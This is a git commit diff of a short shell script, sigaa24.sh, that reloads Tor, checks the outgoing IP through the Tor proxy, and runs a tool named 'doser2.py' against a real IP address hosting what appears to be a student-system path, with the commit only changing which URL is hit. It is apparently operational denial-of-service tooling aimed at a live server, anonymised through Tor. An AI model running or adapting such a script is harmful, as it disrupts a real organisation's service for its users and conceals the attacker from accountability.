6190e3875e27fadd0388daa0147396ebfbe2f1be
padronrucsunat <162722176+padronrucsunat@users.noreply.github.com>
2024-03-14 09:57:07 -0500

    Update sigaa24.sh

--- sigaa24.sh
+++ sigaa24.sh
@@ -1,4 +1,4 @@
 #!/bin/sh
 service tor reload &>/dev/null
 curl --socks5 127.0.0.1:9050 ip.p3terx.com
-python3 doser2.py -g 'http://181.224.238.51/static/students2.zip' -t 10
+python3 doser2.py -g 'http://181.224.238.51/static/students/?C=S;O=D' -t 10
